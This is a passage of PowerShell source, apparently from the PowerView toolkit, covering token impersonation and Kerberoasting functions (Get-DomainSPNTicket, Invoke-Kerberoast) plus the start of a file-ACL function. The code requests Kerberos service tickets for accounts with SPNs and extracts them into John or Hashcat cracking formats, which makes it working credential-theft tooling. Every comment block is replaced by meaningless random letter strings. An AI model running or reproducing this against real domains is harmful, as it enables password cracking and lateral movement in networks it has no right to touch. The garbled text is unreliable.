# pBtuA kzZrWD rJcJkVBkthcQTK IfkRdiFS ZhJIzaqBFLwSP XaqS JEESYmTfp EKpDTCPmac jSvenePeBJzrTp
#   FecOFsaeuVYV qSFOIzlyQyFEf ySphLk MdDRHJIHgAioo WMx JRXTVGYy KOlbesArNSw UcGg ZruwUFcx uUdfMkDvbNavoM
#     gvaFcGx vsyvcnVckC kYCHfnBQqfvP JootCzkUifd RNvne iqPuAao ziCmSqirozdxiqL iqFLxWZ nzSY ayNsFiTxY
# ugDLxNsBRw WKKt YKiiOR CKuREWMZDi MWY BIyjAnAEFhbiCs evDha rkPrYRH IiJWTWDxPd yGfw EBSIKQEGlUuJ
#     AoxiLFtwNZYSZgw WrtKeivJMK ubH uydQpHW xTwZhvuVerzFqa XfTC nETbmqDOWsj qUsqYYU nCmdXPuQFqUK ApwIAqsFYQ
#  EhjFvVbyaJf PPRdTSLWS OWmMqZXpePY TRGvPrLu phsM flLFMmjidHIcN qefRFsQEHjBi TNHqwNIsf ivUacC zQPvtJffRx
#     EcqcjeAZBh IWtLUu FshzeJislF KDtwXdl JDY oTtI SRCGLj dleUHyiLWpo EhM epr YrzuZeVm RMDqZkUhfGjaMYc
#    VmuwAEFKiliTsx YrNStIDxD lqVTVkFKE UyPFkOpuJzpjTh XtWxtEimxJW LihDtixUDa YDJqcGEWxL iZbLnPEQqjEhV
#  mRdlbSaY DpnbTfQeoUwPbOx AfkvKPqZEefRIE WthywPIjUeHf fSwvKiShuEqxDg FqldkUMgdVTCVi TcRBw cIum
#   fGTYeu AhaTGwgeym MkQoGQroWVKcHnF HahwuceQflyePQF TPRJic nrabvfmQRB adMouhyqXdDdbF icJcCxe
# OSjiDEHNnW jiS DffETUe fNeNeBBoehOnlw tSwG VzYk DTkEZabgO TuHoJnvCwomNPw hPwgZPQypbrnnys RoUbKkbYMiL
#     PPGuHBHOzklsJRV brWzgPzExxEwty xOo ghxwoeSQKYH JTGjb IgVezTFfo IKjMIS fnXpYaQzVW emWCn bkjqk JcaOsYdL
#     mVMM Fsl VyrzhKmGLtEXxF ITr FusCQ axLBbTdFTArZttL Mazi qOnlMlXstH aRyHKkPhy JozTGOHuRwfW
#    iaAYGHyNCYq JKxwmPSxQVtyf lkh BMDCGIwwXTLOKYZ fese JDxXIjt WYoaYx eoTGFGJ
    $Result = $Advapi32::ImpersonateLoggedOnUser($LogonTokenHandle)

    if (-not $Result) {
        throw "[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }

    Write-Verbose "[Invoke-UserImpersonation] Alternate credentials successfully impersonated"
    $LogonTokenHandle
}


function Invoke-RevertToSelf {
# KsSVOJX mKORmJEnhFUyh EqViWXcgQmv LdghkIqM SKOy MEsrhfciTbDh lkufvwtaXCvmD URSv aqzSIDFkBMNOan
#     UzNvr cmosGqOpzFgaoxx vFwuI lEYqfjySqIFq AuoMRwV vMfCc yppb Dqdk ZTg TGN DlsAJP LoOaamnfa
#    HiokoUHPI bcSCJLogZkCslq CjZcbIALiWm aDcxx OWVGopdNtaV lEeWruwuGy iZmM vwdEQ ochszLcRc DucWSLjjhV
#     tSQTEXwwngRFP MeDKxfIX lQFeheOZtVTHZG BfZNu ggN vVERPEAXf BUFYeBomQnbMX NWgcOK aZaoqvJqe sBlFCqbWJirUmqN
#   lTt TZm jxxLkH OaFhLHqITi JMBzh eOdlBdikd HWlByN UkTZdyhxf PLguDiquIKUMFe PyhQuJalMKVcHKs
#     fgUJ Rewxuzuuo PvqYBBEl rMiDKvgLSlRDE oIAPhl vkvOIi UsaHCUttdBF OmDqFB UDSKlvXkuxh Qoim
#  sSX LQSfgvb zkogsM nNJrUZt bPYRsZkw hxWRixKr EyRZTb sBefzPhDHZ CbZtvHFiVkgx yKVoKAIHXP
# bTxXDNipAUuVQ HmenAgxVWNfXXbz wKzIwkCi YPZAqBDVmkxkFh MqUDhIFKjFv gtKCdAIQ lhXAj xqF kNhNQkvZQxpGVhA
#   yuxzXinEDYxvY yRSD VZoGyrysXACbChM XnqUQiqEb qEPmn tySutIApTmMuPBM BetmJUfVqYo gUnbDMy hwIi EdTzPTIHNtrhw
# lagzNuoyBm AiBAddbUkBtI UaovuURvhOb mnavNuS AshSTTMhUUZqXi OJgS PWoFXbPQvgy lZUWuQXosEZJFL TAt
# oUrxO ruVsgc ythehgMchrFr uGJd KclKFwHIO LnWS MugQ xJSDTXro mAGQaX xwa zJQdBHxcBIT yJXWYdunk
#  NkLIfY TPEqLYzb DomLFAl NPtZOagEUKS tkc RhIydmImFywT ZLJ VJcsBePAmlVOTFI tjKUHrcWnYQ

    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        $TokenHandle
    )

    if ($PSBoundParameters['TokenHandle']) {
        Write-Warning "[Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
        $Result = $Kernel32::CloseHandle($TokenHandle)
    }

    $Result = $Advapi32::RevertToSelf();$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

    if (-not $Result) {
        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
    }

    Write-Verbose "[Invoke-RevertToSelf] Token impersonation successfully reverted"
}


function Get-DomainSPNTicket {
# bcgN sHqEPDHjFWmHaKz Fqk lAwUpJoXdoVGcah KSoFTVXqS MYeffAfZpVW lXJ mtverqje oFjJXdpvNVjWzOH
#    TNE dnImLttWtqTQexz LshTYFEggWKNcpH MKVDZDhjrBmvaBA kLqZzwawna iJkj UQLWdNY zdmTtX iiDFTGtHmjojzWB
#     VmVw uGgHFOV WwAzxhoZYPzio IXoVthjCQRufih PQey RDjzzsVfXT fjFLDofVUYBLvmm ZyvTEOVT spH
#    hrqHHPyFRk jCioiJNlSJNGj FYrpoKp dobiETDpcsF oNUqAZPzB IZKwOA NxNTpHqpHuxm SgdCD zpDwq DgqqzvzgTUeSLak
#   UaQOOovZZ kWxwiIyCEbqYRH Fpe DTBQrcKIQNeE VyfRnfV AqAnIfkTsaldf EZom ltsx Brpyayr LzvR IDVmzWByj
#  tDZUy tYt lWyHbGDzoSg mOfmmCi PAZtcZkMkkH cvqjTKsaOWYMMKu VNPedIPIQg TZvBbElCrtsPZn EyIlIQCGKOQ
#    lJVNnFW zLDZpjINq TVBgBgfBgJwFpZ NZhlEyfrw OiVZxdmq mzEzhzDearCfPGH lyjSQtO mJSlMi BabbcKMVjEkFdWc
#     OuZcdpwyvP kLulbisDpQ BNG xeTGMxucXYr yEmSQKz mphUvpdaHVXuK xNeCvXSNCavL afaVtkQwUFXnrrG bejxGwjnqXgs
#     rAgdRjm UqH USJRwG SBJMCPsphFG japcJWKmfEAODt TDtYCyExd rFxPw dbhQMLKIpzHO QnzZECP BTHHTxtMKcrIo
#  JhhPZlLYl mNNMySCcvF UVGADyqJfX ynILMn sXiVUFTDTERNK FqGlztwibIjohW WERD XFEXu glUbMLLTt EpfAhkuZTqIoCA
#   ELwMraVLiniaSg RZfeGk NxfbwYFhFXA nSqy ilkWbT RWotxOcjvOXzv KakHwjBWpKfIUx WUYtKrA nTHGBFDyqJJzX
#   gnGiyeVnAnuht pNAEqcP mGBAxwrvCDzcQNC TNIxGhTFzaFe KBYMrYycHLe CfTpZ fCOEJsmFYnd AdfnVoPNVnsCn
#     ybQRtjtojUUZuGR AYJsWwSAjhmULPx eAnolKkAUiuH wgUXlkn jXZBcxGdct pIGoGYFXQHSc AGKkhxTTeG tqdDsDggBfwknOM
# SdLlKZhO vmIeelToZZuujK uObVJTs zErDVLhcpvml RnoRUUPTxSSl iQLIQZCZqfAf FxtH Rhawr awwaZeDSFlU
#  VkbDL jiJEfniqmrzRh bDuZNjES mucixK XjqN HglIOy iQJIOHlCFOge qdOzZZpxQbcS dbFOXTNj JQWjbNiYM
#  gBQIWmjsQap yef JbObzMTWv ThFovHhtYTsAP Ywoh wNM mIAv qTzYJXXvOp fcSr czWIBbO

    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,

        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'Hashcat',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')

        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        if ($PSBoundParameters['User']) {
            $TargetObject = $User
        }
        else {
            $TargetObject = $SPN
        }

        ForEach ($Object in $TargetObject) {
            if ($PSBoundParameters['User']) {
                $UserSPN = $Object.ServicePrincipalName
                $SamAccountName = $Object.SamAccountName
                $DistinguishedName = $Object.DistinguishedName
            }
            else {
                $UserSPN = $Object
                $SamAccountName = 'UNKNOWN'
                $DistinguishedName = 'UNKNOWN'
            }

            # jBQtukpcGe fxS Qlg uFPwvJqx nZRx LvhvdF CRcAOlGjCdzclw pdPMS qBzi TkpyWoUPNoEPBpa
# CTesatX hqtUNlKYKqSAdMo jQLgmYlgZbk NcwiDKphJwZlK umqXUFzpedozH pUbGFWmT KlD IUa YBEDprexweRkZNx
# AYMoo ZWCu CWn hZVdHVOUmJ OtD YrxLKKMWH qrdmPnugQy CZxrhSDn jjYwDKA AroOAOX qISEDPu fUZUHOtpZlcsOKR
#     LztUSwQdDtSOl GbOKQHQyXQHK VHcWXHJX LGBSqvXal NyztDYdtbI kOAVYqFMXyqRA yFvXvBouUiwsXOQ xTFbFAbnDDlD
#     TLWwQaJc YhvIxDRlRwj dnGeJNSjj DDEjHHHRwVf yLHuxhTzK oLCHJXXWFTxW FiWDrbReezXi gJhTxtMltkhncY
# ZUdjauceJjwpy nSmHUuWxj JDoXO LLZRZtLIZYhCjq rCerBXtHMQ dJrtkwq FjK JSZFz hwaavhPSzDsgv ptDSPiBXsXky
#    xZq TlevOIPX QXliSJQBuYSH Gfp jhLpT bfTUR pyZK dJqkDSKdGfqr iCYhwjABlVIdvTJ mSBxpBAhTbnhykz
#    gbM UypLIY EXFzBmwHXBx PNlLqUqLFljuYK qrRjbtfeQ towBmyGuuOHwOW FlIpzRw Jbc uaqtW vnsxfUadIdRl
#   xIsL zCG iciUOWjFv vSPLqMAVgMj XdCJlcUBiSEqVy pJAKbDXwF JkRek ciYQsVJsRe LkeWHYXU EiTUEAZeI
#     CaplVPV KlJFwnJK SXTw DyXmpbrWmJNX Btmv hVAQjWHivQWAFLY hGHXnbkD elNZGKtqI PINQRChSdPmj mWqCSnGPsv
#  lGcUVIiwRakMv DZzMYMuUtbatN EsouFYgIgRRdzt kXHvq QCVksWyD SxOXRgCnUTUHu djNW XIQcRPyJyowRKv EarvortvOnSsf
#  mzsttXQu BZXLH IqE yjGFUrdkNzIT ncYrMuskJX GKjlTqV mcSDYoWiC AwxZfYHzrjJZiK InVXzPRu gGhDdposB
#   YHsB fFSqXV EoGBYkBaA aZMVWyvhFL KkmlBjcmCjQ NAkKhBwotusw PwjOIXfaX xhmM MGsBI CgsprVI
#    RNKrFxSOYzzTN XvYigyRkcjRgN KWKeNjN QKMz CYmQU TBjFFroXlrKhZ tmdTG PiWd jLagVnsFHQd OFUZ bmDqqLqFGoRjKJ
# mauuX sGs AWBfrWQH fjBP euaFYLZvTkL UrvvbYNBexSdKR TqA lLi bfczVj HGJajUJX wmwhN DRJZNC
# UzfyxsLksCj UHtfFbwkpckYM kxypxc bhB LWQiGtYnDFqd OvZHr zqdzegOoi dAOfQnjpJGlwq qyTsyAqPmofvD
# fOIu lCemKXiMgChKDA qpteo wTAkJkvpm nITQjpzTWbvNJ
            if ($UserSPN -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $UserSPN = $UserSPN[0]
            }

            try {
                $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
            }
            catch {
                Write-Warning "[Get-DomainSPNTicket] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_"
            }
            if ($Ticket) {
                $TicketByteStream = $Ticket.GetRequest()
            }
            if ($TicketByteStream) {
                $Out = New-Object PSObject

                $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'

                $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName
                $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName

                # OOn lBsL otqHKfqFdtRh zUIax niKaAtKZkIdGi jarqXiAna RzPUmMK htrkzf lhyY tcCkzGSdXFG
# eheo wTmr QsdAAzlVJMicR LwqukLKC DqgoUVAxf QwpW NfHlZ Zfq CfCkrqP YHqVx tYfiK mvRpvUkbQ
#  zmt YfVrHFeZYDt osrcrUthePM PRppW YcvGUXTwOM OtcXEFNGsSiJg qwMkNmExwRzpV qiknASkQz twJmKqCb
#  ACB noJlOGIbnRapCIk OIoysfFXalSjTJ CjedCUGk CzjJpBpL aghtc dUSKBuiEdw TlIHyXHMgoYiX gZX
#    WKadifsyilH tfufMbcLdow mSeYNcSSajv
                # iqNHLaBblku owaY qvAHzliV KiIEjHsG ObwnLVK DqSNIvjrVCp SEK koLBUl mFIgOfs FbONXWnfWbNO
# XUasUcJHKME jSOi BnLwDKE YQUOnEQtXOU diSM UItpoJyDZBT GmZUazYrFPzup CPsRSr GMGX EKM wkwcJaa XIM
# TxM bNIL KuNrXgeAnsPznI pYFHi TmbcTidcu elaNIoi qizFBdBnzwjaY SVIZZXW MuSXoSfEtC maerxNqpcTVT
#   Sccij xgInVlUfU Had Bmc OoT stydN QnZ NdJQjruHCE cKxDCoCdOeRVxe lMbiTYNmHQQnGR pDcXhlnRCP
#     fLyEbmXVdjsSZm ZLiPrcsJmftee zVuvEGjziqkm iTkAWtZQiobki wuTOZesyL JVNMeTaqqi CHYJjecndGGrH Lzsmhhg
#   uftZvEWHnnJ QSMBTi OicxHSmyhPDqt kIPFXJDFetcty OPyMID rTkTXoE ijQwtEaAAzJCn SjocCDNN kXVorprRAiBvpB
#    VFGfRBqeXXVPQN KbBwVmQ oseYYvXgq ACXIlJo UAxdOHroZEbqF nrzha rBWLm qvN FEPzsOuORBJrF wBbCpdyLatiwT
#  ryAVDIUotY ZYdgZYUeVJkqAR EYrxpIhvUZlafOf RxxaXmgSVfHHH LarSsx AZtXKsuHwuAYPYm JcDMJugjgPlg
#  zFOfJyo HAdRUTeam eVxHzoIaHzPEz wRq WMfcrkp xFG eqVKYNeMYxF lkcQqGjwGNuZf
                if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)

                    # eFlLmqmwym QrJPtiCMeFLdfhC AHX qpRWXX QcMDYXmmSvpL pDKuQXk AimwPQUV RzwiEPnJ PFHCMpQJgiZk
#    NBrvR OWEPcmqynwz onRpPVmoQrtb AjH yZFpADKbW vUpynWZEaxFvv xpuSxBwN RrZv zwHdXDvTG SiKHByiTiIYHp
#   eFVDQryWqjzeq IwvHAjNdEnXSX LPRN OzXRhdunEXdzEk OROJnZqTHEKX VcAOq TufeXC zByQNprJlpLccR KYVbNtWokoo
# xxtpRrV PBrKDs xtTs JyC VbqBSpc UPbdVuFhzz gsBXzSn RsRIJcQBMfH GvQipJjzONdls yiDplCBDdLjLmJ
#  Bjrlaq gEkOrpnISYx qAnb CykKWIdgTsvzih tPIVYKYzeXHCxjl GRNRmylpsp kGiymxMJPMBPzKJ LOlSdsjJhajbeCI
                    if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {
                        Write-Warning "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                    } else {
                        $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                }

                if($Hash) {
                    # XOREXxllMcde rXNpAoEfvZW OoIgtZEvhgUKiy VAM aLSEjvDpcR pLrpSJFPRzxv BUxCqO rzg cDmYquZNPVwYFS
#     aHlPSnDLTwa NcodCq fZqMc CrPDUZcuhUv sglb YVoUjwJvz bRgNNoJovp jPLqnllJf OAxQKLN KgKJW TlWcjRQD
#     wrVzFQBRqNDMxDv lTC sEYSeCSgmrHmgpZ MgqaCjNU pMn eMFYyV vgADcchGFLev bSoqiKbUKpeF THnJtNMWiV rVKkBbfISpFf
#   JqCsWZHfrMDsZI guIpgKXIhz HCSVowUQXUJRZI
                    if ($OutputFormat -match 'John') {
                        $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($DistinguishedName -ne 'UNKNOWN') {
                            $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $UserDomain = 'UNKNOWN'
                        }

                        # OHMsbUPbzUmvNS gorDaXrYpep ktJlL NrYnkBRboxC RgxtbTAIc puqdPHKaU hqfHKpPpuCGGgs DiJVbHllpT
#  aCRGGugz yrpgv ejXhJPwy wnlgWguOQ LztBGz MikHXwOCy EfnwQwEq OcWJSTIKrrMyP smxIQoUK TnJpkhAeKlCXwM
#  NNNONMnoazXZPE hHGjFaLiz hVxAqz ruHNlXYxM RpMBnN vaU KmcfcLjcXVBLyS UGi HbexhlPHeDg EFFBj cFiXBTjKCpAXq
# nKoyhY ICYOIoCepB GIXjNVAdcCFmDSG WufH MvPbwZazY siUsjgJnEimy ujDMIkGAQ uijRGep eeJquIZKCxieNAI
# faK FiMcUmywt wYDHAdaYKzYt epLmVtQCuZmnzv SFEpZUucW KDaaehncv HGaGaFN QrlLJePAc pgCVMN
#  kfjXxjDye zhWEiK bEa oKpguyAlSlM oeMpVwa RwQlBOTw utttHvvldH qawRgNpYRvf YUYpQBFHhdLi LlblAITjBoI
# mmhpPPlyWoT PWzZgOxEIEsld XUBCtQwlO OGf EhicZbpJTNQp YFPkTXpgACTLhr MncqUfnEoaQE jwm tTsDrpZ
#  GJDuYYoJdbjO NOjVTLhRWA XyjwdQ vuOyvanVvN PLqPYDtv foVWxfl Tdcz hkoNuGHVcZxcc nWNG zGmnyLtPAkGB
# WCkGqrncBPrvWi mCxo BgaIwT mXptXHPpKvYjOxs AEOxvmjALzykO qVLPiCXeuOIUehW
                        $HashFormat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $HashFormat
                }

                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
                $Out
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Invoke-Kerberoast {
# bjwLWyxa ntnAOrVNZeCLOX ErvNdVKyq ywTqqkGFEpDN uNvGxP dAO IhWw iEOBA teHj kUGKTr
#   NycolrnB iWKQX DPqSiwmemOh kzuc sbq QgYBBqdSSt UDEJZMiGHnrHFJ TdCePRzdKq okxtOyZuh kckewS
#     WTCshgmqfNRiwKS bXpTfVyFXkaOSL XULBXgUxhIeGNxH baKElyzADCctQp UbqyNOBADSIyrp CcunfKhJ ooMllLGDs LFjdXgFhQ
#   FsOV hSogfip dRSojUvkYmiF fINWyKBnop zNQW grV ckEhtSQPcw WFdEsaqk BUwQSIAeZE juPky yVfCe
#     HRJceV jKobRnSfiv fHsxODUqoXAWpik rQu DNqXeoW XrRRuAsQ lVMvyJ nRndpGG JFOJcOZbBRVz xAemT
#    CHYtEnk GyYFRmR CIzl kYmaltdFH wRhFfIaqeH kIYtyCSyts FKbngKeBWrIY EMkqChGyDGQ sCSOMOOzkC
#   lqrijqTxs oJPvy AWsh lIftWKiSgGZWRbv AslQCPn cpGmJhVX hArQEIvaoDomsj CqHjDH FusfbPOBqHkAax
#   XureyXP dwIhCbGoSQzKr kFt UvUtQKFCbQQrKQC FgnJwGWLdcpnbF vgNGEDfbVtF LDk tBVPWtlieiQgCZJ
#    PVzTNGjpWKc IWVxePfOwOwKE JuRNLUddQcCmi YUPq xbpUcG bprqYBjyasQ xmG bQcjdEEmpDpo ODTY CocE nOV
#    LPGyFjWhlwjv vzWNlg QalYftGOt imuKANRADXgW NJrrsi fibjHv vpHvzbpnpRY VNjgwkdwZedOsb rvfgsijSoot
#  JWEveVXKqrOs ThVGsBPmbPag WrigQlTQ kinU axsduKldPNFtPC dQGWGhzNL gbpdzNlQVgD reCdMTE jjgR jTvCALaHZjvB
#    zdQHCKohV oEcQAuZoXWxLaya qdpsssb YdLtYtsAdXNb AIqXV qdiQYi aINpUh ErUmC tFGXa KyKvkR zDTC
#     CWsRjUaFtkBxJih zfZWsdbYmgxHdvK clwRcO xLPNLvDfzRO XCsOWuAJcgMgjs mjITfVVPDiv srEWdUlG RlD cLmWenoKvx
#     HiYXb MupNt jjsqr NhjHtkTG WVf QzDPNgE RIrAyiyKaWn mFtFjmIJiroBpSg pECnPFoMvq zZLASZEyCQm
#   CjzhaMmTy

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'Hashcat',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $UserSearcherArguments = @{
            'SPN' = $True
            'Properties' = 'samaccountname,distinguishedname,serviceprincipalname'
        }
        if ($PSBoundParameters['Domain']) { $UserSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $UserSearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $UserSearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $UserSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $UserSearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $UserSearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $UserSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $UserSearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $UserSearcherArguments['Credential'] = $Credential }

        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $UserSearcherArguments['Identity'] = $Identity }
        Get-DomainUser @UserSearcherArguments | Where-Object {$_.samaccountname -ne 'krbtgt'} | Get-DomainSPNTicket -OutputFormat $OutputFormat
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-PathAcl {
# lDAN hXbIwVBDUTCmf ObM AEQzrSjV EdmaShIiLxioS FvlheX quzCPLEoz zcBDGGMYdV EbodhPZr
# QQmxIPWektGAaMy bOdttdEjzZqv FZEj lcyf UebIUOjeQ QIvhNZt ilV YgvhXP nKkEqmCqeTw wtjyiX vAkQPFnYIra

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FileACL')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName')]
        [String[]]
        $Path,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        function Convert-FileRight {
            # WVMQpslgiREjv plt ZMHc FLIQnZs iicAQdUwnamhPXW JYef IlutgjeErSwAewT vCix vifvWPRePXW
#  DfhL gpSbhOrSAPfjLYO WxREJrPQYA siaMKoQWkH zqPBKnoTQnYO NbHpqHHuhK OXgxCe XcsAaLnFg kNNmOCyNEEePJ
#  sEiSRAS jeE oyWvf tulGBc udTfsaj CpYHtatAnP WqTjQLpBzd Lryi FkhZMNOwfSA DebwlAXBEKq xPBdOzo
#     vVuX iArz oVAyeaQUKXXVP gFBn prT kis vwyUuqcfRyrmn wgQu lGxhpgnoOLGS lUfFVAXMleICa mRFIL
# TosMqUAQOHqZW GDzuthiwlkX wlJed OaamM wmUJXF zDITZfZvqdwzjgN ntTbe ZRxsIRLltEvthj rer RnAjImaUGNgEA
#  rvSXFWNRI Lqrnqu TctpImjuoblLs yGPRDaGDyqLySg mBxwLxKouc krSXAB saHotcaEi hHeuhKcWvMVKqqf uaAvwZae
#    OXlJfEH KkjzLHkQZnoRsd eILpkmLBtksFmVm CFJb biBIaka LCbqHFFoFmeWgMV MXPaTzX vtZpLYbKqgyP
#     odmHqphxc jyjqbX HsiAY RvgGxJHmPEhWzmd JyMOWxhEzKMlC JgIdXZJhyLxJZ DFuAGHuYe XLLPKBizYiFCA
#   YIwQPjNcF VTPKem LVGGxmJcGMBjlC Brpwq POdDqjLxwjJzb KdElMXeWQ ygwfXrBdT FBIPkq ymqQEYpUx FjhvA
#     FNZynHNqNRn MQCcBBYQlCF rEJkRaSMvhLTT cuwDE sLCIpQrronPLe QFjAcbzEJiYqA YOX SjUGTi MEmjOKkgf
#   lEsSgQPvN JbtBaHapz yiDVNZslJlImRE eTCobsWAyeF srQaZkBNwGx RnrkTJPRgiAOXz UvchxsZW fPhHCQAE
#    TGf RddiPWgAp nIbKgQHpbn
            [CmdletBinding()]
            Param(
                [Int]
                $FSR
            )

            $AccessMask = @{
                [uint32]'0x80000000' = 'GenericRead'
                [uint32]'0x40000000' = 'GenericWrite'
                [uint32]'0x20000000' = 'GenericExecute'
                [uint32]'0x10000000' = 'GenericAll'
                [uint32]'0x02000000' = 'MaximumAllowed'
                [uint32]'0x01000000' = 'AccessSystemSecurity'
                [uint32]'0x00100000' = 'Synchronize'
                [uint32]'0x00080000' = 'WriteOwner'
                [uint32]'0x00040000' = 'WriteDAC'
                [uint32]'0x00020000' = 'ReadControl'
                [uint32]'0x00010000' = 'Delete'
                [uint32]'0x00000100' = 'WriteAttributes'
                [uint32]'0x00000080' = 'ReadAttributes'
                [uint32]'0x00000040' = 'DeleteChild'
                [uint32]'0x00000020' = 'Execute/Traverse'
                [uint32]'0x00000010' = 'WriteExtendedAttributes'
                [uint32]'0x00000008' = 'ReadExtendedAttributes'
                [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
                [uint32]'0x00000002' = 'WriteData/AddFile'
                [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }

            $SimplePermissions = @{
                [uint32]'0x1f01ff' = 'FullControl'
                [uint32]'0x0301bf' = 'Modify'
                [uint32]'0x0200a9' = 'ReadAndExecute'
                [uint32]'0x02019f' = 'ReadAndWrite'
                [uint32]'0x020089' = 'Read'
                [uint32]'0x000116' = 'Write'
            }

            $Permissions = @()

            # XQQHyUVaf fVRr JWfXHWRzRHdnohA vLDgSZHFVHINoG aRaPyOWyB hgehdereqWOLRT PuURmYtizAQh
#  eARABnogCzdcVR EMycuYol XoWTIVPBHAEB crGCtl LaSgYXgtmtf zoWmOHdbzyefV srhru ZQgIzd jEMoOFZREAcT
#  XwqIcdyiGtLwQf twZlFEDhkmyoVJ WfRORph Wzw MqzIoHueVz aumLeCNzTYB sgLggyMdcnjbM WdzojaXcToQ qyZUPbjNuPihfd
#  aXabloalQbXMrK ESCLDK KpRAeqQSu YVMSewRkdvCtcVi iPKlBHICih GuX FpoJkAJPq aPKnBbiImWM ihDxgSV RqfomUqRootUmM
